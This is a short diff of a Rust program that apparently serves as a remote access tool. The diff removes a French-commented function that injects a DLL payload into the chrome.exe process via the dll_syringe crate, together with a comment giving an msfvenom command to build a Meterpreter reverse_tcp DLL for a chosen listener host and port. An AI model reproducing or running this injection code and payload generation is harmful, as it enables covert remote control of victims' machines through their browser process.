@@ -14,7 +14,6 @@ use std::net::TcpStream;
 use std::process::Command;
 use std::str::from_utf8;
 use std::env;
-use dll_syringe::{Syringe, process::OwnedProcess};
 use std::env;
 
 #[derive(Serialize, Deserialize)]
@@ -174,19 +173,4 @@ async fn main() -> io::Result<()> {
             Err(_e) => {}
         }
     }
-
-//dll injection
-}
-pub fn dll_injector() {
-    //on cherche le process à injecter 
-    let targer_process = OwnedProcess::find_first_by_name("chrome.exe").unwrap();
-    //on crée un "syringe" pour le process cible
-    let syringe = Syringe::for_process(targer_process);
-    //on injecte le payload dans le process cible
-    let injected_payload = syringe.inject("injection_payload.dll").unwrap();
-    //a test
-
-    //Dll generate
-    //sudo msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --plateform windows -f dll LHOST=ip LPORT=4444 > payload.shellcode
-
 }
